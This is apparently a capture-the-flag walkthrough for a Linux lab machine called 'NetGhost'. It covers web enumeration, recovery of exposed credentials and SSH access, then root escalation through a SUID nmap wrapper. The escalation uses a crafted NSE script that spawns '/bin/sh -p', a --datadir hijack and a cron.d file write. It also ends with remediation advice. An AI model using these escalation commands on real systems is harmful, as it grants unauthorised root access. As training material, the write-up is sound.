---
title: "NetGhost — Ulfr Labs (NESTCON) Walkthrough"
author: "Sampson Quarmy Sokpoli (@_0xh4sh)"
date: ""
---

# NetGhost — HTB-style Walkthrough (Ulfr Labs / NESTCON)

**Difficulty:** Easy &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **Platform:** Ulfr Labs (NESTCON) &nbsp;|&nbsp; **Creator:** Ulfr Labs

---

## Disclaimer

This walkthrough documents a machine solved on **Ulfr Labs**, a legal, sandboxed training platform (part of NESTCON) built for practising offensive security skills. All activity described here was performed inside the lab's VPN-isolated environment against a machine the author was explicitly authorised to attack.

Do not attempt any of these techniques against systems you do not own or do not have **written permission** to test. The target IP address changes between lab resets, so it is referenced throughout as `<TARGET_IP>` — substitute your own assigned IP when you follow along.

> This document is written as a teaching walkthrough: each phase explains *what* was done, *why* it was done, and *what to look for* — not just a list of commands.

---

## Box Summary

| Field | Value |
|---|---|
| Name | NetGhost |
| Difficulty | Easy |
| OS | Linux |
| User flag reward | 10 marks |
| System (root) flag reward | 20 marks |
| Total points | 30 marks |
| Key techniques | Directory fuzzing (`ffuf`), `robots.txt` information disclosure, exposed backup file recovery, SSH credential abuse, SUID binary argument pass-through, Nmap Scripting Engine (NSE) code execution |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning & service version detection |
| `ffuf` | Web directory and endpoint brute-forcing |
| `curl` / Browser | Inspecting web pages, `robots.txt`, and exposed directories |
| `ssh` | Remote shell access as low-privilege user (`netadmin`) |
| `readelf` / `strings` | Inspecting the SUID binary before touching it |
| Lua / NSE | Crafting a custom script to trigger root command execution via the SUID wrapper |

---

## Methodology Overview

A standard black-box methodology was followed, mirroring how a professional penetration tester would approach an unknown host:

1. **Reconnaissance** — scan the target to identify open network ports and running services.
2. **Enumeration** — discover hidden web directories, examine exclusion rules, and investigate exposed admin backups.
3. **Initial Foothold** — leverage discovered credentials to log in via SSH and capture the user flag.
4. **Privilege Escalation** — identify an unsafe SUID wrapper (`nmap-helper`), confirm its behaviour before exploiting it, then abuse Nmap's own scripting engine to spawn a root shell.
5. **Post-Exploitation** — retrieve the root flag and document remediation guidance.

---

## Phase 1 — Reconnaissance

Begin with a port scan across the target host to determine all exposed network attack surfaces.

```bash
nmap -sC -sV -p- -T4 -oN nmap/netghost-recon.nmap <TARGET_IP>
```

**Scan Results:**

| Port | State | Service | Version / Details |
|---|---|---|---|
| 22/tcp | Open | SSH | OpenSSH (Debian/Ubuntu Linux) |
| 80/tcp | Open | HTTP | Werkzeug 3.0.1 (Python 3.12.3) |

The scan reveals a standard SSH service alongside a Python-based web application. Because SSH requires authentication credentials, the web server on port 80 is the primary avenue for initial enumeration.

---

## Phase 2 — Web Enumeration

### 2.1 Exploring the Web Application

Navigating to `http://<TARGET_IP>/` presents a small landing page branded "NetGhost Systems." Checking the two linked pages directly:

```bash
curl -s http://<TARGET_IP>/about
curl -s http://<TARGET_IP>/contact
```

```text
NetGhost Systems - Founded in Accra, Ghana
```

```text
Contact: info@netghost.gh
```

Nothing exploitable here on its own, but worth noting in passing — on a real engagement this kind of page can hint at the organisation's actual domain/branding conventions, which sometimes shows up again later (default credentials, naming patterns, etc.).

### 2.2 Directory and File Fuzzing with `ffuf`

To check for unlinked files and hidden routes, run a directory scan using `ffuf` with a standard wordlist:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://<TARGET_IP>/FUZZ \
     -o ffuf-scan
```

**Key Findings:**

```text
about                   [Status: 200, Size: 127, Words: 8, Lines: 1, Duration: 141ms]
contact                 [Status: 200, Size: 110, Words: 3, Lines: 1, Duration: 136ms]
robots.txt              [Status: 200, Size: 60, Words: 4, Lines: 4, Duration: 163ms]
```

The presence of `robots.txt` immediately stands out — it's rarely in a default wordlist hit list for a reason, and worth checking first before going wider with a bigger wordlist.

### 2.3 Inspecting `robots.txt`

```bash
curl -s http://<TARGET_IP>/robots.txt
```

```text
User-agent: *
Disallow: /admin-backup/
Disallow: /internal/
```

Two directories are explicitly disallowed: `/admin-backup/` and `/internal/`. `robots.txt` is a convention respected by well-behaved crawlers, not an access control mechanism — anything listed here is actively worth visiting, not avoiding.

### 2.4 Enumerating `/internal/`

```bash
curl -s http://<TARGET_IP>/internal/
```

This returns an **Internal Network Dashboard** page. Reproduced here (markup trimmed, content preserved) since it's the single most useful piece of evidence on the whole box:

```text
⚠ Internal Network Dashboard
This page is for internal use only.

Network Status
Server: netghost-prod-01
Uptime: 47 days
SSH Port: 22 (active)
Web Port: 80 (active)
Admin: netadmin
Last backup: /admin-backup/credentials.txt

Recent Logs
[2026-09-01] SSH login: netadmin from 192.168.1.105
[2026-09-02] Backup completed: credentials.txt
[2026-09-03] NMAP scan detected from 10.10.0.0/16
[2026-09-04] WARNING: nmap-helper SUID binary detected
```

Three things fall out of this page, each one driving a later phase of this walkthrough:

1. A valid administrator username: `netadmin`.
2. The exact path to a backup file: `/admin-backup/credentials.txt`.
3. A direct pointer to the privilege-escalation vector: `WARNING: nmap-helper SUID binary detected`. This is the reason Phase 4 goes straight to checking for that specific binary rather than enumerating SUID binaries blind.

### 2.5 Retrieving `/admin-backup/credentials.txt`

Browsing to `http://<TARGET_IP>/admin-backup/` reveals directory listing is enabled, exposing `credentials.txt` directly:

```bash
curl -s http://<TARGET_IP>/admin-backup/credentials.txt
```

```text
# Network Admin Credentials
Username: netadmin
Password: [REDACTED]

# TODO: Change these before deployment!
```

> **Password intentionally omitted.** The actual value is not reproduced here on purpose — this walkthrough is meant to teach the *process* (noticing `robots.txt` points somewhere, checking what's disallowed, finding an open directory listing, reading what's in it) rather than handing over a working login. Retrieve the real value yourself by following the steps above on your own instance.

---

## Phase 3 — Initial Foothold (User Flag)

Using the credentials recovered in 2.5, connect to the target host via SSH:

```bash
ssh netadmin@<TARGET_IP>
```

Confirm access and identity:

```bash
id
hostname
```

You should see a UID belonging to `netadmin` and a hostname matching what the `/internal/` dashboard reported (`netghost-prod-01`) — if the hostname doesn't match, double-check you're on the box you think you're on before going further.

The usual first privilege-escalation check is worth running, if only to rule it out quickly:

```bash
sudo -l
```

On this box, `sudo` isn't installed at all (`command not found`) — this is a minimized Ubuntu image with non-essential packages stripped out, so the usual sudoers-misconfiguration checks are a dead end here. That's a useful negative result in itself: it tells you to stop looking at `sudo` and focus enumeration elsewhere (which is exactly what the `/internal/` dashboard already pointed you toward).

Retrieve the user flag:

```bash
cat /home/netadmin/user.txt
```

> **User Flag Reward:** 10 Marks on the Ulfr Labs dashboard.

---

## Phase 4 — Privilege Escalation (Root Flag)

### 4.1 Locating the SUID Binary

The `/internal/` dashboard already named the target directly: `nmap-helper`. The natural first move is a quick lookup rather than a full filesystem sweep:

```bash
locate nmap-helper
```

```text
-bash: locate: command not found
```

`locate` relies on a pre-built `mlocate` database that's frequently absent on minimal images and lab boxes like this one — worth remembering as a dead end you'll hit often, not a sign anything's wrong. Fall back to `whereis`, which checks standard binary/man/source paths directly with no database required:

```bash
whereis nmap-helper
```

```text
nmap-helper: /usr/local/bin/nmap-helper
```

That gives the exact path immediately. Confirm the permissions:

```bash
ls -l /usr/local/bin/nmap-helper
```

```text
-rwsr-xr-x 1 root root 16176 Oct 12 05:55 /usr/local/bin/nmap-helper
```

Two things matter in that output:

- The `s` in the owner-execute position (`rws`) is the **SUID bit** — the binary runs with the effective UID of its *owner*, regardless of who launches it.
- Owner and group are both `root`, so anyone who can execute this file gets a process running with `root`'s privileges for as long as it runs.

If a future box doesn't drop as convenient a hint as a dashboard log line, the fallback is a blind SUID sweep instead:

```bash
find / -perm -4000 -type f 2>/dev/null
```

### 4.2 Confirming the Binary's Behaviour Before Exploiting It

A ~16 KB binary at `/usr/local/bin` wrapping `nmap` is a classic "sysadmin convenience script" pattern — usually written without much hardening. Rather than guessing at an exploit, confirm what it actually does first.

First, a baseline check:

```bash
/usr/local/bin/nmap-helper --help
```

The output is Nmap's own `--help` text, verbatim — a strong signal the binary isn't doing anything clever with the arguments, just handing them straight to `nmap`.

Next, test the lower-risk, higher-reward possibility first: does it wrap the command in a shell (`system()`/`popen()`), which would make it vulnerable to simple metacharacter injection?

```bash
/usr/local/bin/nmap-helper '; /bin/sh -p'
```

```text
Starting Nmap 7.94SVN ( https://nmap.org )
Unable to split netmask from target expression: "; /bin/sh -p"
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.02 seconds
```

No shell spawns. `nmap` itself reports it tried to parse the entire string as a **target specification** and failed — which is exactly what you'd expect if the helper hands the raw argument straight to `nmap`'s own parser, with no shell sitting in between to interpret the `;`. That rules out a shell-wrapper and confirms the opposite, more useful conclusion: the helper forwards arguments **directly to `nmap`'s own argument parser**, with no privilege drop.

That's actually the better outcome here — it means the full surface of Nmap's own command-line features is now running as root, including features that themselves can execute code.

### 4.3 Exploitation via a Malicious NSE Script

Nmap's Scripting Engine (NSE) runs Lua scripts, and those scripts can call out to the operating system via `os.execute()`. Since the wrapper runs as root and takes `--script` unfiltered, a script that shells out will do so **as root**.

Create a minimal NSE script:

```bash
printf 'os.execute("/bin/sh -p")\n' > /tmp/shell.nse
```

Invoke the helper with it, against a harmless local target:

```bash
/usr/local/bin/nmap-helper --script=/tmp/shell.nse 127.0.0.1
```

This drops into a shell almost immediately. The `-p` flag matters here and is easy to skip by accident: it tells `sh` to **preserve** the effective privileges it was started with, instead of dropping back to the real (non-root) UID on startup, which is `sh`'s default behaviour whenever real and effective UID differ. Without `-p`, you risk landing in a shell that *looks* like it worked but is quietly running without root privileges.

Two things are worth expecting at this point, so you don't mistake either one for a failure:

- **The shell will look broken.** NSE's `os.execute()` doesn't allocate a proper terminal, so you'll likely see garbled backspace sequences and mangled output from commands like `ls` or `cat` the moment you start typing. It's still a fully functional shell underneath — if the noise bothers you, upgrade it once you're in (`python3 -c 'import pty; pty.spawn("/bin/sh")'` is a common one-liner for this), but it isn't required to finish the box.
- **Confirm root with `id`, not by eye.** In this case it came back fully as root — `uid=0(root) gid=0(root) groups=0(root)` — rather than just an elevated effective UID with the original user still showing anywhere. Exactly how much of the identity flips to root can vary by binary and build, which is one more reason to check `id` explicitly instead of assuming based on how the terminal looks.

```bash
id
```

### 4.4 Alternative Vectors (Not Needed Here, Worth Knowing)

If `--script` had been filtered on a similar box, two other options exist for the same situation — unsafe argument pass-through into a privileged Nmap invocation:

**NSE runtime hijack via `--datadir`:**
```bash
mkdir -p /tmp/ndata
printf 'return function() os.execute("/bin/sh -p") end\n' > /tmp/ndata/nse_main.lua
/usr/local/bin/nmap-helper --datadir=/tmp/ndata 127.0.0.1
```

**Arbitrary root file write (output redirection):**
```bash
/usr/local/bin/nmap-helper -oN /etc/cron.d/rootpwn -sn 127.0.0.1
```

Neither was required to solve this box — included for completeness, since recognising the pattern (an unfiltered privileged wrapper around a feature-rich binary) matters more than memorising one specific payload.

---

## Phase 5 — Post-Exploitation / Evidence

With root access, retrieve the system flag:

```bash
cat /root/root.txt
```

> **System Flag Reward:** 20 Marks on the Ulfr Labs dashboard.

Clean up the test artifact left on the box before closing out:

```bash
rm -f /tmp/shell.nse
```

---

## Process Notes

A few things worth calling out about *how* this box was approached, since the reasoning matters as much as the commands:

1. **The dashboard log did the hard part.** The `/internal/` page named the exact vulnerable binary (`nmap-helper`) before any local enumeration happened. On a real engagement, information disclosure like this is often the actual finding — the privilege escalation technique that follows is almost secondary once you know what to look for.
2. **Confirm behaviour before exploiting.** Running `--help` and testing simple metacharacter injection first (Section 4.2) cost nothing and ruled out the wrong theory (shell wrapping) before committing to the right one (NSE abuse). Jumping straight to a complex exploit without this step risks wasted time chasing the wrong vulnerability class.
3. **`robots.txt` is a map, not a wall.** Both disallowed paths on this box were directly exploitable once visited. Treat any `Disallow` entry as a prioritised to-do list during enumeration, never as a reason to skip a directory.
4. **Check the effective UID, not just the username.** After the SUID exploit, the shell's prompt still says `netadmin` in some configurations — `id`/`whoami` are what actually confirm root, not the prompt.
5. **Clean up what you drop on the box.** `/tmp/shell.nse` has no reason to persist after you're done; removing it is good practice on any real assessment and costs one command here.

---

## Remediation Recommendations (Defender's View)

| Vulnerability | Severity | Remediation |
|---|---|---|
| Exposed plaintext credentials in a public backup directory | Critical | Remove all backups from the web root (`/admin-backup/`). Disable directory listing in the web server config. Rotate any credential that was ever exposed this way, and enforce credential changes before production deployment — don't ship with a `# TODO: Change these` comment. |
| Sensitive paths disclosed via `robots.txt` | Medium | Never rely on `robots.txt` as access control. Restrict `/internal/` and similar administrative endpoints with real authentication and network ACLs. |
| SUID bit on a network tool wrapper (`nmap-helper`) | Critical | Remove the SUID bit (`chmod -s /usr/local/bin/nmap-helper`). If non-root users genuinely need raw-socket scanning, grant the specific Linux capability instead (`setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap`) rather than full SUID root. |
| Unrestricted argument pass-through to a feature-rich binary | High | If a privileged wrapper is required at all, allow-list the specific flags it needs (e.g. only `-sn`, `-p`) and explicitly block anything that loads or writes files (`--script`, `--datadir`, `-oN`, `-iL`, `--append-output`). |

---

## Appendix — Command Cheat-Sheet

```bash
# 1. Reconnaissance
nmap -sC -sV -p- -T4 <TARGET_IP>

# 2. Web enumeration
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<TARGET_IP>/FUZZ
curl -s http://<TARGET_IP>/robots.txt
curl -s http://<TARGET_IP>/internal/
curl -s http://<TARGET_IP>/admin-backup/credentials.txt

# 3. Foothold
ssh netadmin@<TARGET_IP>
cat /home/netadmin/user.txt

# 4. Privilege escalation
ls -l /usr/local/bin/nmap-helper
find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/nmap-helper --help
/usr/local/bin/nmap-helper '; /bin/sh -p'
printf 'os.execute("/bin/sh -p")\n' > /tmp/shell.nse
/usr/local/bin/nmap-helper --script=/tmp/shell.nse 127.0.0.1
id
whoami

# 5. Evidence & cleanup
cat /root/root.txt
rm -f /tmp/shell.nse
```

---

## References

- Ulfr Labs (NESTCON): <https://ulfr.nestcon.live/>
- Nmap Scripting Engine (NSE) Documentation: <https://nmap.org/book/nse.html>
- GTFOBins — Nmap: <https://gtfobins.github.io/gtfobins/nmap/>

---

**Author:** Sampson Quarmy Sokpoli &nbsp;·&nbsp; **Handle:** `@_0xh4sh`
